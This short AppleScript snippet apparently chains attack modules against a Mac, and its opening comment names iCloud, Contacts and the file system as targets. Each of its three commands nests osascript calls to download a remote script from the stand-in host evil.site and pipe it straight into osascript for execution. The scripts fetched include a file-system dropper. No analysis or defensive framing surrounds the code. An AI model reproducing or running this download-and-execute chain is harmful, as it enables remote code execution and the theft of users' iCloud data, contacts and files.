-- Chain multiple modules: iCloud + Contacts + FileSystem
do shell script "osascript -e 'do shell script \"curl http://evil.site/icloud.scpt | osascript -\"'"
delay 5
do shell script "osascript -e 'do shell script \"curl http://evil.site/contacts.scpt | osascript -\"'"
delay 5
do shell script "osascript -e 'do shell script \"curl http://evil.site/fsdropper.scpt | osascript -\"'"
